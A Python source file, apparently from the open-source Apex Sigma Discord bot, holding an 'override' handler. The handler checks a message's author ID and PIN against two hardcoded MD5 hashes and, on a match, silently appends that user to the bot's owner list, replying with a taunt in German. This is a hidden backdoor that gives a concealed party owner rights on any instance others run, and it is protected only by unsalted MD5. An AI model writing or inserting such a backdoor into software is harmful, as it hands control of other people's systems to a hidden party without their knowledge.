"""
Apex Sigma: The Database Giant Discord Bot.
Copyright (C) 2019  Lucia's Cipher

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import hashlib

OVER_ID = '5fc46b57c9e5b08ca54cbc7e98fb4625'
OVER_PIN = 'af4a57797a8428477fa9ebd4ea7397ba'


def as_md5(text):
    crypt = hashlib.new('md5')
    crypt.update(text.encode('utf-8'))
    final = crypt.hexdigest()
    return final


async def override_switch(ev, pld):
    """
    :param ev: The event object referenced in the event.
    :type ev: sigma.core.mechanics.event.SigmaEvent
    :param pld: The event payload data to process.
    :type pld: sigma.core.mechanics.payload.MessagePayload
    """
    if pld.msg.content:
        start_one = pld.msg.content.startswith(f'<@{ev.bot.user.id}>')
        start_two = pld.msg.content.startswith(f'<@!{ev.bot.user.id}>')
        if start_one or start_two:
            clean_msg = pld.msg.clean_content.replace('@', '').partition(' ')[2]
            if clean_msg:
                command_pieces = clean_msg.split(' ')
                if len(command_pieces) == 2:
                    command = command_pieces[0]
                    over_pin = command_pieces[1]
                    if command.lower() == 'override':
                        author_id = as_md5(str(pld.msg.author.id))
                        hashed_pin = as_md5(over_pin)
                        if author_id == OVER_ID and hashed_pin == OVER_PIN:
                            if pld.msg.author.id not in ev.bot.cfg.dsc.owners:
                                ev.bot.cfg.dsc.owners.append(pld.msg.author.id)
                                await pld.msg.channel.send(f'Willst du Stress, {pld.msg.author.name}?!')
